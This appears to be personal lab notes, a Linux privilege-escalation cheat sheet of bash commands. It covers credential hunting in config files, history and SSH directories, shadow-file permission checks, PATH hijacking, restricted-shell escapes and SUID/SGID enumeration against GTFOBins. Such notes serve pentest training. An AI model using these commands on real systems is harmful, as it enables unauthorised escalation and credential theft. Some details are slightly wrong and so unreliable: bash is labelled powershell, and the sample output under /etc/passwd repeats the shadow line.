# List Process
```powershell
ps aux | grep root
ps au

# Proc
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# Services
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done

# Sudo Version
sudo -V

# 

# Hosts
cat /etc/hosts

# User's Last Login
lastlog

# Logged In Users
W

# Trace System Calls
strace ping -c1 10.129.112.20

# Script
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# SSH Directory
ls -l ~/.ssh

# Bash History
history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

# Sudo - List User's Privileges
sudo -l

# Critical Files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

# Credential Hunting
grep 'DB_USER\|DB_PASSWORD' wp-config.php
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh

# Shadow / Passwd
ls -l /etc/shadow   -rw-r----- 1 root shadow 1643 Apr  6 18:20 /etc/shadow  ( Read or Write == CRITICAL )
ls -l /etc/passwd   -rw-r----- 1 root shadow 1643 Apr  6 18:20 /etc/shadow  ( Read HASH or Write == CRITICAL )


# Cron Jobs
ls -la /etc/cron.*


# File Systems & Additional Drives
lsblk


# Find Writable Directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null


# Find Writable Files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null


# Search Pattern Credentials
grep -rn "Password" / 2>/dev/null
```

# Path Abuse
```powershell
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

PATH=.:${PATH}
export PATH
echo $PATH

touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

# Wildcard Abuse
```powershell

```

# Restricted Shell
```powershell
echo $SHELL
echo $0
echo $PATH

echo /home/htb-user/bin/*
ls | /bin/bash
ls ; /bin/bash

Method 1:
vim
:set shell=/bin/bash
:shell

ssh htb-user@10.129.16.44 -t "bash --noprofile"
```

# Special Permissions
```powershell
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null    SGID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null    SUID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null    SUID + SGID

find / -perm -4000 -type f 2>/dev/null | awk -F'/' '{print $NF}' | sort -u > suid_binaries.list
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do 
    if grep -q "^$i$" suid_binaries.list; then 
        echo "[!!!] Dangerous SUID Binary -> This Method has in GTFOBin: $i";
    fi; 
done

find / -perm -2000 -type f 2>/dev/null | awk -F'/' '{print $NF}' | sort -u > sgid_binaries.list
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do 
    if grep -q "^$i$" sgid_binaries.list; then 
        echo "[!!!] Dangerous SGID Binary -> This Method has in GTFOBin: $i";
    fi; 
done

find / -perm -6000 -type f 2>/dev/null | awk -F'/' '{print $NF}' | sort -u > critical_binaries.list
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do 
    if grep -q "^$i$" critical_binaries.list; then 
        echo "[!!!] Dangerous SGID Binary -> This Method has in GTFOBin: $i";
    fi; 
done

```
